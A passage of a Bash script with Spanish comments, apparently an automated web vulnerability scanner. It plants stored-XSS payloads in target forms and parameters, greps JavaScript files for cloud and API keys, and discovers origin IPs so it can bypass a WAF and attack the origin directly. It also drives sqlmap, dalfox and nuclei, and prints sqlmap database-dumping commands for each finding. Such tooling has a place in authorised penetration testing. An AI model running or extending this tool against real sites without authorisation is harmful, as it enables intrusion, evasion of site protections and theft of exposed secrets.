                local creds; creds=$(printf '%s' "$resp" | grep -i '^access-control-allow-credentials:' | grep -i true)
                printf "[CORS] %s origin=%s acao=%s%s\n" "$url" "$origin" "$acao" "$([ -n "$creds" ] && echo ' +creds')" >> "$out"
            fi
        done
    done < "$targets"
    rm -f "$targets"
}
stored_xss_scan(){   # XSS ALMACENADO: planta un canary unico (GET params + formularios POST) y lo busca
                     # CRUDO (sin escapar) en una 2a peticion -> si el breakout persiste, es ejecutable.
                     # Precision: solo cuenta si aparece SIN codificar. OJO: ESCRIBE en el objetivo.
    local out="$results_path/stored-xss.txt"; : > "$out"
    have curl || { skip "stored-xss (need curl)"; return; }
    local token="sbx${RANDOM}${RANDOM}" payload
    payload="${token}\"><svg onload=confirm(1)>"
    local gets="$results_path/.sx_get" forms="$results_path/.sx_forms"
    grep -E '\?[^#[:space:]]*=' "$urls_output_path" 2>/dev/null | no_static | head -n "${SB_SX_MAX:-60}" > "$gets"
    awk -F'?' '{print $1}' "$urls_output_path" | grep -iE '\.(asp|aspx|php|jsp|do|cfm|cgi|pl)$' | sort -u | head -n 40 > "$forms"
    local deadline=$(( $(date +%s) + ${SB_ENGINE_CAP:-600} )) u
    # 1) PLANTAR por GET (qsreplace el payload en cada parametro)
    if have qsreplace; then
        while IFS= read -r u; do
            [ -z "$u" ] && continue; [ "$(date +%s)" -ge "$deadline" ] && break
            u=$(printf '%s' "$u" | qsreplace "$payload" 2>/dev/null)
            [ -n "$u" ] && curl "${curl_hdr[@]}" -sk -m 10 -o /dev/null "$u" 2>/dev/null
        done < "$gets"
    fi
    # 2) PLANTAR por FORMULARIO (best-effort: extrae name="..." y postea el payload a la action)
    local fp page fields f action posturl dargs
    while IFS= read -r fp; do
        [ -z "$fp" ] && continue; [ "$(date +%s)" -ge "$deadline" ] && break
        page=$(curl "${curl_hdr[@]}" -sk -m 10 "$fp" 2>/dev/null)
        printf '%s' "$page" | grep -qi '<form' || continue
        fields=$(printf '%s' "$page" | grep -oiE 'name="[^"]+"' | sed -E 's/name="//I; s/"$//' | sort -u)
        [ -z "$fields" ] && continue
        dargs=(); for f in $fields; do dargs+=(--data-urlencode "${f}=${payload}"); done
        action=$(printf '%s' "$page" | grep -oiE '<form[^>]*action="[^"]*"' | head -1 | sed -E 's/.*action="//I; s/"$//')
        posturl="$fp"
        case "$action" in
            http*) posturl="$action" ;;
            /*)    posturl="$(printf '%s' "$fp" | grep -oE '^https?://[^/]+')$action" ;;
            ?*)    posturl="${fp%/*}/$action" ;;
        esac
        curl "${curl_hdr[@]}" -sk -m 10 -o /dev/null "${dargs[@]}" "$posturl" 2>/dev/null
    done < "$forms"
    # 3) COSECHAR: re-pedir las paginas del corpus y buscar el breakout CRUDO con el token
    awk -F'?' '{print $1}' "$urls_output_path" | sort -u | head -n "${SB_SX_MAX:-60}" | while IFS= read -r u; do
        [ -z "$u" ] && continue; [ "$(date +%s)" -ge "$deadline" ] && { : > "$results_path/.cap.stored-xss"; break; }
        curl "${curl_hdr[@]}" -sk -m 10 "$u" 2>/dev/null | grep -qF "${token}\"><svg" \
            && echo "[STORED-XSS] canary $token reflejado CRUDO (ejecutable) en $u" >> "$out"
    done
    rm -f "$gets" "$forms"
}
secrets_scan(){      # Divulgacion: secretos de ALTA confianza en JS/JSON/map (read-only). Prefijos
                     # distintivos (FP minimo); nuclei-dast fuzzea params, no mira el CUERPO de los JS.
    local out="$results_path/secrets.txt"; : > "$out"
    have curl || { skip "secrets (need curl)"; return; }
    local js="$results_path/.js_urls"
    grep -iE '\.(js|json|map)(\?|$)' "$urls_output_path" 2>/dev/null | awk -F'?' '{print $1}' | sort -u | head -n "${SB_SECRETS_MAX:-80}" > "$js"
    [ -s "$js" ] || { info "secrets: no hay JS/JSON en el corpus"; rm -f "$js"; return; }
    local re='AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|AIza[0-9A-Za-z_-]{35}|ghp_[0-9A-Za-z]{36}|gho_[0-9A-Za-z]{36}|github_pat_[0-9A-Za-z_]{40,}|glpat-[0-9A-Za-z_-]{20}|xox[baprs]-[0-9A-Za-z-]{10,}|sk_live_[0-9A-Za-z]{24,}|SG\.[0-9A-Za-z_-]{22}\.[0-9A-Za-z_-]{43}|-----BEGIN [A-Z ]*PRIVATE KEY-----'
    local deadline=$(( $(date +%s) + ${SB_ENGINE_CAP:-600} )) u m one
    while IFS= read -r u; do
        [ -z "$u" ] && continue; [ "$(date +%s)" -ge "$deadline" ] && { : > "$results_path/.cap.secrets"; break; }
        m=$(curl "${curl_hdr[@]}" -sk -m 10 "$u" 2>/dev/null | grep -oE "$re" | sort -u | head -n 5)
        [ -n "$m" ] && while IFS= read -r one; do echo "[SECRET] $u -> $one" >> "$out"; done <<< "$m"
    done < "$js"
    rm -f "$js"
}

############################  ORCHESTRATION  ##########################################
# Out-of-band (blind SSRF / blind-XSS) is handled by nuclei's own built-in interactsh.
# run_engine wraps a check: prints start/end, records its elapsed time for the summary.
run_engine(){        # $1 = display name (= output basename)  $2 = function
    local name="$1" fn="$2" t0; t0=$(date +%s); echo "$t0" > "$results_path/.start.$name"
    info "${bcyan}⟳${reset} $name running..."
    "$fn"
    local dt=$(( $(date +%s) - t0 )); echo "$dt" > "$results_path/.t.$name"; rm -f "$results_path/.start.$name"
    local n=0; [ -f "$results_path/$name.txt" ] && n=$(count_hits "$name" "$results_path/$name.txt")
    if [ "${n:-0}" -gt 0 ]; then good "$name done: ${bred}$n hit(s)${reset} in $(fmt_time "$dt")"; else info "$name done: clean in $(fmt_time "$dt")"; fi
}
monitor_engines(){   # live heartbeat (~every 20s) while engines run; polls fast so Ctrl-C reacts quick
    local i nm now line any t=0
    while :; do
        any=0; for i in "${!MON_PIDS[@]}"; do kill -0 "${MON_PIDS[$i]}" 2>/dev/null && any=1; done
        [ "$any" = 0 ] && break
        sleep 5; t=$((t+5))
        [ $((t % 20)) -eq 0 ] || continue
        now=$(date +%s); line=""
        for i in "${!MON_PIDS[@]}"; do
            nm="${MON_NAMES[$i]}"
            if [ -f "$results_path/.start.$nm" ]; then
                line="$line ${bcyan}⟳${reset}$nm${dim}$(fmt_time $(( now - $(cat "$results_path/.start.$nm" 2>/dev/null || echo "$now") )))${reset}"
            else line="$line ${green}✓${reset}$nm"; fi
        done
        printf "${dim}  ..en curso (%s)..${reset}%b\n" "$(fmt_time "$t")" "$line"
    done
}
run_engines(){
    local specs=() s
    test "$dast" = "true"         && specs+=("nuclei-dast:broad_scan")
    test "$xss_deep" = "true"     && specs+=("dalfox:xss_deep")
    test "$sqli_deep" = "true"    && specs+=("sqlmap:sqli_deep")
    test "${stored_xss:-false}" = "true" && specs+=("stored-xss:stored_xss_scan")
    test "${secrets:-false}" = "true"    && specs+=("secrets:secrets_scan")
    test "$cors" = "true"         && specs+=("cors:cors_scan")
    [ ${#specs[@]} -eq 0 ] && { warn "no engines enabled in config.ini"; return; }
    rule "MOTORES" "$([ "$PARALLEL" = 1 ] && echo 'en paralelo' || echo 'en secuencia') · $(printf '%s ' "${specs[@]%%:*}")"
    if [ "$PARALLEL" = "1" ]; then
        MON_PIDS=(); MON_NAMES=()
        for s in "${specs[@]}"; do
            run_engine "${s%%:*}" "${s##*:}" &
            MON_PIDS+=($!); MON_NAMES+=("${s%%:*}")
        done
        ENGINE_PIDS="${MON_PIDS[*]}"
        monitor_engines
        wait "${MON_PIDS[@]}" 2>/dev/null
        ENGINE_PIDS=""; MON_PIDS=(); MON_NAMES=()
    else
        for s in "${specs[@]}"; do run_engine "${s%%:*}" "${s##*:}"; done
    fi
}
count_hits(){        # $1 = engine name  $2 = file -> REAL finding count (not raw lines)
    local name="$1" f="$2"
    [ -f "$f" ] || { echo 0; return; }
    case "$name" in
        sqlmap) echo "$(grep -cE '^Parameter:' "$f" 2>/dev/null)" ;;              # 1 per vulnerable param
        dalfox) echo "$(grep -cE '\[POC\]|^https?://' "$f" 2>/dev/null)" ;;       # 1 per XSS PoC
        *)      echo "$(grep -cvE '^[[:space:]]*$' "$f" 2>/dev/null)" ;;          # nuclei/cors: 1 per line
    esac
}

show_findings(){     # pinta la EVIDENCIA real por motor; $1="parcial" (opcional) lo rotula
    local f="$results_path" any=0 tag="${1:+ · parcial (interrumpido)}"
    printf "\n${bcyan}━━━━━ VULNERABILIDADES %s${reset}${dim}%s${reset}\n" "$host" "$tag"
    ls "$results_path"/.cap.* >/dev/null 2>&1 && printf "  ${byellow}nota: algun motor toco el tope de tiempo (SB_ENGINE_CAP): los hallazgos pueden estar INCOMPLETOS${reset}\n"
    if [ -s "$f/nuclei-dast.txt" ]; then any=1
        printf "${bred}■ nuclei-dast${reset}\n"; sed 's/^/   /' "$f/nuclei-dast.txt"; echo
    fi
    if [ -s "$f/dalfox.txt" ] && grep -qE '\[POC\]|^https?://' "$f/dalfox.txt" 2>/dev/null; then any=1
        printf "${bred}■ XSS (dalfox) · inyeccion${reset}\n"
        grep -E '\[POC\]|^https?://' "$f/dalfox.txt" | sed 's/^/   /'; echo
    fi
    if [ -s "$f/sqlmap.txt" ] && grep -qE '^Parameter:' "$f/sqlmap.txt" 2>/dev/null; then any=1
        printf "${bred}■ SQLi (sqlmap) · punto(s) de inyeccion${reset}\n"
        sed -n '/^---$/,/^---$/p' "$f/sqlmap.txt" | sed 's/^/   /'
        # fingerprint del objetivo que sqlmap identifica (SO / tecnologia / DBMS). Sale aunque cape
        # antes de volcar --dbs, asi que da contexto del stack aun en un resultado PARCIAL.
        if grep -qE '^(web server operating system|web application technology|back-end DBMS):' "$f/sqlmap.txt" 2>/dev/null; then
            printf "${bred}  fingerprint:${reset}\n"
            grep -E '^(web server operating system|web application technology|back-end DBMS):' "$f/sqlmap.txt" | sort -u | sed 's/^/   /'
        fi
        # comando POR finding (reproducir/explotar): se asocia cada Parameter con su URL (el ultimo
        # 'GET/POST http://' que sqlmap tecleo antes del punto de inyeccion). POST -> --forms (es como
        # lo encontro la pasada de formularios, sin pegar el __VIEWSTATE enorme).
        printf "${bred}  comando por finding:${reset}\n"
        awk '
          /^GET https?:\/\//  {u=$2; next}
          /^POST https?:\/\// {u=$2; next}
          /^Parameter: /{ pr=$2; m=$0; sub(/.*\(/,"",m); sub(/\).*/,"",m); if(u==""){next}
            if(m=="GET") printf "sqlmap -u \"%s\" -p %s --batch --dbs\n", u, pr;
            else         printf "sqlmap -u \"%s\" --forms -p %s --batch --dbs\n", u, pr }
        ' "$f/sqlmap.txt" | sort -u | sed 's/^/   /'
        if grep -qE 'available databases \[' "$f/sqlmap.txt" 2>/dev/null; then
            printf "${bred}  bases de datos (--dbs):${reset}\n"
            awk '/available databases \[/{p=1;next} p&&/^\[\*\]/{print} p&&NF==0{exit}' "$f/sqlmap.txt" | sed 's/^/   /'
        fi
        echo
    fi
    if [ -s "$f/stored-xss.txt" ]; then any=1
        printf "${bred}■ XSS almacenado · persistente${reset}\n"; sed 's/^/   /' "$f/stored-xss.txt"; echo
    fi
    if [ -s "$f/secrets.txt" ]; then any=1
        printf "${bred}■ Secretos expuestos (JS/JSON)${reset}\n"; sed 's/^/   /' "$f/secrets.txt"; echo
    fi
    if [ -s "$f/cors.txt" ]; then any=1
        printf "${bred}■ CORS${reset}\n"; sed 's/^/   /' "$f/cors.txt"; echo
    fi
    [ "$any" = 0 ] && printf "  ${green}sin vulnerabilidades confirmadas${reset}\n"
}

summarize(){         # $1 = total seconds; per-phase + per-engine times (all modes, incl -s)
    local total="$1" f n t p
    rule "RESUMEN $host"
    for p in waf:WAF/CDN crawl:crawl prep:prep liveness:liveness; do
        [ -f "$results_path/.t.${p%%:*}" ] || continue
        t=$(cat "$results_path/.t.${p%%:*}"); printf "  ${dim}%-14s %s${reset}\n" "${p##*:}" "$(fmt_time "${t:-0}")"
    done
    n=$(cat "$results_path/.n.acquire" 2>/dev/null); [ -n "$n" ] && printf "  ${dim}%-14s %s URLs${reset}\n" "corpus" "${n:-0}"
    [ "${TARGET_DOWN:-0}" = 1 ] && printf "  ${bred}%-14s objetivo no respondia -> motores omitidos${reset}\n" "AVISO"
    for f in nuclei-dast dalfox sqlmap stored-xss secrets cors; do
        [ -f "$results_path/$f.txt" ] || continue
        n=$(count_hits "$f" "$results_path/$f.txt"); t=$(cat "$results_path/.t.$f" 2>/dev/null)
        local cap=""; [ -f "$results_path/.cap.$f" ] && cap=" ${byellow}(PARCIAL: tope ${SB_ENGINE_CAP:-600}s)${reset}"
        if [ "${n:-0}" -gt 0 ]; then printf "  ${bred}%-14s %s hit(s)${reset}${dim} · %s${reset}%s  -> %s\n" "$f" "$n" "$(fmt_time "${t:-?}")" "$cap" "$results_path/$f.txt"
        elif [ -n "$cap" ]; then printf "  ${byellow}%-14s sin hallazgos${reset}${dim} · %s${reset}%s ${dim}(INCONCLUSO: no termino)${reset}\n" "$f" "$(fmt_time "${t:-?}")" "$cap"
        else printf "  ${green}%-14s clean${reset}${dim} · %s${reset}\n" "$f" "$(fmt_time "${t:-?}")"; fi
    done
    printf "  ${bgreen}TOTAL: %s${reset}${dim}%s · log: %s${reset}\n" "$(fmt_time "$total")" \
        "$([ "$PARALLEL" = 1 ] && echo ' (motores en paralelo)')" "$LOGFILE"
    show_findings
}
############################  WAF / CDN detection + origin discovery  #################
WAF_DETECTED=""; ORIGIN_IP=""
origin_discover(){   # $1 = fronting IP; best-effort: find+verify the real origin behind the CDN/WAF
    local front="$1" cands ip
    have uncover || { warn "uncover ausente: no puedo buscar el origen real"; return; }
    info "buscando IP de origen (uncover: shodan/censys/fofa por el cert de $host)..."
    cands=$(uncover -q "$host" -silent 2>>"$LOGFILE" | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | sort -u)
    [ -z "$cands" ] && { warn "sin candidatos de origen (uncover necesita claves shodan/censys/fofa)"; return; }
    for ip in $cands; do
        [ "$ip" = "$front" ] && continue
        have cdncheck && printf '%s\n' "$ip" | cdncheck -silent 2>/dev/null | grep -q . && continue  # salta IPs de CDN
        # verifica: esa IP sirve NUESTRO vhost al mandar el Host header (el body menciona el dominio)
        if curl -s -m 8 -H "Host: $host" "http://$ip/" 2>>"$LOGFILE" | grep -qiF "$host"; then
            ORIGIN_IP="$ip"
            printf "${bred}  [>>] ORIGEN verificado FUERA del WAF: %s${reset} ${dim}(responde como %s con Host header)${reset}\n" "$ip" "$host"
            _log "[WAF] origin verified: $ip (se atacara directamente)"; return
        fi
    done
    warn "no se verifico un origen directo (quiza bien protegido o el origen no esta expuesto)"
}
waf_detect(){        # detect WAF/CDN at the start; if present, try to discover the origin
    WAF_DETECTED=""; ORIGIN_IP=""; local _wt; _wt=$(date +%s)
    rule "WAF / CDN" "proteccion perimetral de $host"
    local prov="" cdn="" ip=""
    have dnsx && ip=$(printf '%s\n' "$host" | dnsx -silent -a -resp-only 2>>"$LOGFILE" | head -1)
    have wafw00f && prov=$(wafw00f "$seed_url" 2>>"$LOGFILE" | grep -iE 'is behind|seems to be behind|is protected' | head -1 | sed 's/\x1b\[[0-9;]*m//g' | tr -s ' ')
    # Solo CDN/WAF reales cuentan; 'cloud' (AWS/GCP/Azure) es SOLO hosting, no un WAF delante -> no dispara.
    [ -n "$ip" ] && have cdncheck && cdn=$(printf '%s\n' "$ip" | cdncheck -resp -silent 2>>"$LOGFILE" | grep -iE 'cdn|waf' | head -1)
    if [ -n "$prov" ] || [ -n "$cdn" ]; then
        WAF_DETECTED="${prov:-$cdn}"
        printf "${bred}  [!!] WAF/CDN DETECTADO${reset} ${dim}(IP %s)${reset}\n" "${ip:-?}"
        [ -n "$prov" ] && printf "${bred}       %s${reset}\n" "$prov"
        [ -n "$cdn" ]  && printf "${bred}       cdncheck: %s${reset}\n" "$cdn"
        _log "[WAF] prov='$prov' cdn='$cdn' ip=$ip"
        origin_discover "$ip"
    else
        good "sin WAF/CDN aparente${ip:+ (IP $ip)}"
    fi
    echo "$(( $(date +%s) - _wt ))" > "$results_path/.t.waf"
}
target_responsive(){ # true si el host contesta trafico de ataque sobre el corpus FINAL (tras el
                     # posible bypass de WAF). Evita 20 min de escaneo fantasma cuando el objetivo
                     # rechaza las conexiones (el run que daba "58 hits" los rechazaba TODAS).
    local sample u code ok=0 n=0
    sample=$(grep -E '\?[^#[:space:]]*=' "$urls_output_path" 2>/dev/null | head -n 4)
    [ -n "$sample" ] || sample=$(head -n 4 "$urls_output_path" 2>/dev/null)
    [ -n "$sample" ] || sample="$seed_url"
    while IFS= read -r u; do
        [ -n "$u" ] || continue; n=$((n+1))
        code=$(curl "${curl_hdr[@]}" -sk -o /dev/null -w '%{http_code}' -m 10 "$u" 2>/dev/null)
        [ -n "$code" ] && [ "$code" != "000" ] && ok=$((ok+1))
    done <<< "$sample"
    dbg "responsiveness: $ok/$n sondas respondieron (000 = conexion rechazada)"
    [ "$ok" -gt 0 ]
}
probe_target(){      # chequeo LIGHT inicial: el objetivo resuelve y responde? por que esquema?
                     # Fija seed_url al esquema VIVO (evita el timeout de un host http-only probado por
                     # https, que es lo que le hacia perder 23s a wafw00f) y, si no contesta por ninguno,
                     # corta: no gastamos crawl/arjun/liveness en un host muerto o mal escrito.
    # Ademas MIDE la latencia del objetivo (ms/peticion): de ahi salen el timeout por peticion y la
    # profundidad de sqlmap, para ADAPTARSE a cualquier web (lenta -> menos req y mas espera; rapida ->
    # mas profundo). Es general, no depende de las URLs concretas del sitio.
    local sc url resp code lat base="${seed_url#http*://}" order
    case "$seed_url" in http://*) order="http https" ;; *) order="https http" ;; esac
    for sc in $order; do
        url="$sc://$base"
        resp=$(curl "${curl_hdr[@]}" -sk -o /dev/null -w '%{http_code} %{time_total}' --connect-timeout "${SB_PROBE_CTO:-4}" -m 10 "$url" 2>/dev/null)
        code="${resp%% *}"; lat="${resp##* }"
        if [ -n "$code" ] && [ "$code" != "000" ]; then
            seed_url="$url"
            TARGET_LAT_MS=$(awk "BEGIN{printf \"%d\", ($lat+0)*1000}" 2>/dev/null); case "$TARGET_LAT_MS" in ''|*[!0-9]*) TARGET_LAT_MS=500;; esac
            # suelo 10s (no 6): bajo la carga de 6 motores en paralelo el server se ralentiza y con 6s
            # sqlmap mataba cada peticion ('connection timed out') y no confirmaba nada. 10s = el valor
            # seguro de siempre; escala hacia arriba en objetivos lentos (lat*4+3), tope 30s.
            SB_REQ_TIMEOUT=$(( TARGET_LAT_MS*4/1000 + 3 )); [ "$SB_REQ_TIMEOUT" -lt 10 ] && SB_REQ_TIMEOUT=10; [ "$SB_REQ_TIMEOUT" -gt 30 ] && SB_REQ_TIMEOUT=30
            good "objetivo vivo: ${bcyan}$url${reset} ${dim}(HTTP $code · ~${TARGET_LAT_MS}ms/req)${reset}"
            _log "[+] probe: $url -> $code lat=${TARGET_LAT_MS}ms timeout/req=${SB_REQ_TIMEOUT}s"; return 0
        fi
        dbg "probe $url -> ${code:-sin respuesta}"
    done
    return 1
}
scan_target(){       # $1 = host, $2 = seed (host or full URL)
    host="$1"; local seed="$2"; host_re="${host//./\\.}"
    results_path="results/$(printf '%s' "$host" | tr -d -c '[:alnum:].')"; mkdir -p "$results_path"
    LOGFILE="$results_path/sbounty.log"; : > "$LOGFILE"
    rm -f "$results_path"/.cap.* 2>/dev/null   # marcadores de "tope de tiempo" de una corrida anterior
    urls_output_path="$results_path/urls.txt"
    seed_url="$seed"; [ "$seed" = "$host" ] && seed_url="https://$host"
    ORIGIN_IP=""; TARGET_DOWN=0
    _log "=== target $host (seed $seed) ==="
    build_headers ""
    if ! probe_target; then
        warn "${bred}$host no responde por http ni https (no resuelve o rechaza la conexion): objetivo OMITIDO${reset}"
        _log "[!] $host no responde en el chequeo inicial: omitido"; return
    fi
    [ "${waf_check:-true}" = "true" ] && waf_detect
    local t0; t0=$(date +%s)
    build_corpus "$seed_url"
    [ -s "$urls_output_path" ] || { warn "no URLs acquired for $host; skipping checks."; return; }
    if [ -n "$ORIGIN_IP" ]; then
        rule "BYPASS WAF" "atacando el ORIGEN $ORIGIN_IP directamente (Host: $host), sin WAF"
        printf "${bred}  [>>] corpus reescrito a %s con Host: %s -> los motores golpean el origen, saltando el WAF${reset}\n" "$ORIGIN_IP" "$host"; _log "[>>] bypass WAF: corpus reescrito a $ORIGIN_IP (Host: $host)"
        sed -E "s#^(https?://)[^/]+#\1${ORIGIN_IP}#" "$urls_output_path" > "$urls_output_path.o" && mv "$urls_output_path.o" "$urls_output_path"
        seed_url="$(printf '%s' "$seed_url" | sed -E "s#^(https?://)[^/]+#\1${ORIGIN_IP}#")"
        build_headers "$host"
    fi
    if target_responsive; then
        run_engines
    else
        TARGET_DOWN=1
        warn "${bred}el objetivo NO responde a las peticiones de ataque (connection refused/timeout): motores OMITIDOS para no fabricar resultados fantasma${reset}"
        _log "[!] objetivo no responde: motores omitidos"
    fi
    summarize "$(( $(date +%s) - t0 ))"
}

############################  ARGS / MAIN  ############################################
target=""; list_file=""; urls_file=""; headers=""; PARALLEL=1; NO_CAPS=0; url_target=""
# -no-caps y -url son multi-caracter (no caben en getopt -o): se filtran ANTES y se quitan de los args.
# -url lleva valor (la URL enfocada) -> se captura el token siguiente.
_fa=(); _exp=""
for _x in "$@"; do
    if [ -n "$_exp" ]; then url_target="$_x"; _exp=""; continue; fi
    case "$_x" in
        -no-caps|--no-caps) NO_CAPS=1 ;;
        -url|--url)         _exp=1 ;;
        *)                  _fa+=("$_x") ;;
    esac
done
[ -n "$_exp" ] && { echo "ERROR: -url necesita una URL"; out; }
set -- "${_fa[@]}"
PROGARGS=$(getopt -o "s:l:f:H:pDh" -- "$@") || out
eval set -- "$PROGARGS"; unset PROGARGS
while true; do case "$1" in
    '-s') target=$2; shift 2 ;;
    '-l') list_file=$2; shift 2 ;;
    '-f') urls_file=$2; shift 2 ;;
    '-H') headers=$2; shift 2 ;;
    '-p') PARALLEL=0; shift ;;
    '-D') DEBUG=1; shift ;;
    '-h') banner; out ;;
    '--') shift; break ;;
    *) echo "Unknown argument: $1"; out ;;
esac; done

n=0; [ -n "$target" ] && n=$((n+1)); [ -n "$list_file" ] && n=$((n+1)); [ -n "$urls_file" ] && n=$((n+1)); [ -n "$url_target" ] && n=$((n+1))
[ "$n" -ne 1 ] && { banner; echo; echo "ERROR: choose exactly ONE of -s / -l / -f / -url."; out; }

# -no-caps: anula TODOS los topes (tiempo y recuento) poniendolos a valores enormes. Los motores, el
# crawl y arjun corren hasta terminar; el corpus no se trunca. Los timeouts POR PETICION se mantienen
# (evitan colgarse en una peticion muerta). Pensado para un escaneo exhaustivo sin prisa.
if [ "$NO_CAPS" = 1 ]; then
    SB_ENGINE_CAP=2592000; SB_CRAWL_CAP=2592000; SB_ARJUN_CAP=2592000
    SB_CORS_MAX=100000000; SB_SECRETS_MAX=100000000; SB_SX_MAX=100000000; SB_MAX_URLS=0
    warn "modo -no-caps: SIN topes de tiempo ni recuento (crawl/arjun/motores hasta terminar; puede tardar MUCHO)"
fi

# Engine header args, rebuilt PER TARGET (so -l never accumulates). $1 = optional origin-bypass
# Host (domain) forced on every engine when we attack the real IP behind a WAF.
curl_hdr=(); httpx_hdr=(); sqlmap_hdr=(); nuclei_hdr=(); dalfox_hdr=(); sqlmap_host=()
build_headers(){
    curl_hdr=(); httpx_hdr=(); sqlmap_hdr=(); nuclei_hdr=(); dalfox_hdr=(); sqlmap_host=()
    if [ -n "$headers" ]; then
        curl_hdr+=(--header "$headers"); httpx_hdr+=(-H "$headers"); sqlmap_hdr=(--headers="$headers"); nuclei_hdr+=(-H "$headers"); dalfox_hdr+=(-H "$headers")
    fi
    if [ -n "$1" ]; then
        curl_hdr+=(--header "Host: $1"); httpx_hdr+=(-H "Host: $1"); nuclei_hdr+=(-H "Host: $1"); dalfox_hdr+=(-H "Host: $1"); sqlmap_host=(--host="$1")
    fi
}
build_headers ""
extract_host(){ echo "$1" | sed -E 's#https?://(www\.)?([a-zA-Z0-9.-]+)(/.*)?#\2#'; }
is_url(){ printf '%s' "$1" | grep -qE '^https?://[^/]+/.+'; }   # URL WITH a path -> route mode

trap _cleanup INT TERM
banner
install

if [ -n "$urls_file" ]; then
    [ -f "$urls_file" ] || { echo "ERROR: file not found: $urls_file"; out; }
    host="$(extract_host "$(head -1 "$urls_file")")"; host_re="${host//./\\.}"
    results_path="results/$(printf '%s' "$host" | tr -d -c '[:alnum:].')"; mkdir -p "$results_path"
    LOGFILE="$results_path/sbounty.log"; : > "$LOGFILE"
    seed_url=""
    build_headers ""   # para que -H "Cookie: ..." llegue a httpx y a los motores tambien en -f
    # -f: NO hay crawl ni mining (las URLs las das tu), pero las URLs SE PROCESAN: sanea (quita basura
    # estructural) + dedup por firma de parametros + liveness (httpx descarta las MUERTAS). Asi no se
    # atacan URLs rotas, duplicadas ni caidas. El fichero de entrada no se toca.
    urls_output_path="$results_path/urls.txt"
    t_dd=$(date +%s)
    sanitize_urls < "$urls_file" > "$results_path/.f_in"
    dedup_by_params "$results_path/.f_in" > "$urls_output_path"; rm -f "$results_path/.f_in"
    echo "$(( $(date +%s) - t_dd ))" > "$results_path/.t.prep"
    raw=$(grep -cvE '^\s*$' "$urls_file" 2>/dev/null); dd=$(grep -cvE '^\s*$' "$urls_output_path" 2>/dev/null)
    tl=$(date +%s); liveness_filter; echo "$(( $(date +%s) - tl ))" > "$results_path/.t.liveness"
    kept=$(grep -cvE '^\s*$' "$urls_output_path" 2>/dev/null)
    echo "${kept:-0}" > "$results_path/.n.acquire"
    rule "OBJETIVO" "URLs de $urls_file · ${raw:-0} -> dedup ${dd:-0} -> vivas ${kept:-0}"
    t0=$(date +%s); run_engines; summarize "$(( $(date +%s) - t0 ))"

elif [ -n "$target" ]; then
    host="$(extract_host "$target")"
    if is_url "$target"; then rule "OBJETIVO" "ruta $target (host $host)"; scan_target "$host" "$target"
    else rule "OBJETIVO" "host $host"; scan_target "$host" "$host"; fi

elif [ -n "$list_file" ]; then
    [ -f "$list_file" ] || { echo "ERROR: file not found: $list_file"; out; }
    ts=$(date +%s); BATCH_HOSTS=(); BATCH_TIMES=()
    while IFS= read -r line; do
        line="${line%%$'\r'}"; [ -z "$line" ] && continue
        h="$(extract_host "$line")"; [ -z "$h" ] && continue
        tt=$(date +%s)
        # </dev/null: AISLA el stdin del bucle. Sin esto, las tools de scan_target (gau/waybackurls/
        # katana en background heredan fd0 = "$list_file") se COMEN el resto del fichero y el loop ve EOF
        # tras el 1er host -> solo se procesaba 1 de N. Con /dev/null leen vacio y el while sigue leyendo.
        if is_url "$line"; then scan_target "$h" "$line" </dev/null; else scan_target "$h" "$h" </dev/null; fi
        BATCH_HOSTS+=("$h"); BATCH_TIMES+=("$(( $(date +%s) - tt ))")
    done < "$list_file"
    rule "RESUMEN DE TIEMPOS (lote)"
    for i in "${!BATCH_HOSTS[@]}"; do printf "  ${dim}%-34s${reset} %s\n" "${BATCH_HOSTS[$i]}" "$(fmt_time "${BATCH_TIMES[$i]}")"; done
    printf "  ${bgreen}TOTAL LOTE: %s${reset} ${dim}(%s objetivos)${reset}\n" "$(fmt_time "$(( $(date +%s) - ts ))")" "${#BATCH_HOSTS[@]}"

elif [ -n "$url_target" ]; then
    # -url: URL ENFOCADA. Flujo = esa URL + sus llamadas DIRECTAS (crawl shallow desde la URL, sin
    # gau/wayback del host entero ni arjun). -s se queda intacto para host/subdominio + flujo completo.
    host="$(extract_host "$url_target")"; host_re="${host//./\\.}"
    rule "OBJETIVO" "URL enfocada $url_target (host $host) · esta URL + sus llamadas directas"
    CRAWL_FOCUS=1; scan_target "$host" "$url_target"; CRAWL_FOCUS=0
fi
} # <- cierre del grupo que envuelve TODO el script (ver cabecera): no anadir nada debajo de esta linea
